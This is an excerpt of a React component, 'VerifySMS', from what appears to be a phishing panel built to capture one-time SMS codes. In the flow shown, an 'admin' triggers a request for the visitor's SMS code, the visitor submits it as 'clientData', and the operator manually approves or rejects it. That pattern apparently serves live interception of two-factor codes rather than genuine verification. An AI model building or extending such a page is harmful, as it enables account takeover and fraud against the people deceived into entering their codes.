 ...
 * - Awaits admin command to request SMS code
...
export default function VerifySMS() {
  ...
  useEffect(() => {
    ...
    console.log("[VerifySMS] Session status:", newStatus, "lastSeenStatus:", lastSeenStatus);

    // If code was rejected (transitioned from submitted back to requested), show error message
    if (newStatus === "sms_code_requested" && lastSeenStatus === "sms_code_submitted") {
      console.log("[VerifySMS] Code was rejected!");
      setIsWaitingForApproval(false);
      setCode(["", "", "", "", "", ""]);
      setShowRejectionError(true);
      setTimeout(() => setShowRejectionError(false), 3000);
    }
    // If code was approved, redirect to dashboard or next step
    else if (newStatus === "verified") {
      console.log("[VerifySMS] SMS verified, redirecting to dashboard");
  ...
  // Submit SMS code mutation
  const submitCodeMutation = trpc.clientData.submitSmsCode.useMutation({
    onSuccess: () => {
      ...
      <main className="pt-20 md:pt-24 px-4 md:px-8 pb-8 md:pb-0 min-h-screen flex items-center">
        <div className="max-w-7xl mx-auto w-full grid grid-cols-1 md:grid-cols-2 gap-8 md:gap-20 items-center">
          ...
          <div className="space-y-6 md:space-y-8 order-1 md:order-2">
            <div>
              <h1 className="text-3xl md:text-5xl font-bold mb-2 tracking-tight">Verify SMS</h1>
              <p className="text-white/60">Enter your 6-digit SMS verification code</p>
            </div>

            {/* Status Message */}
            <div className={`p-4 rounded-lg border ${
              sessionStatus === "sms_code_requested" 
              ...
              {sessionStatus === "sms_code_requested" && (
                <p className="text-green-400">✓ Admin requested SMS code</p>
              )}
              {sessionStatus === "sms_code_submitted" && (
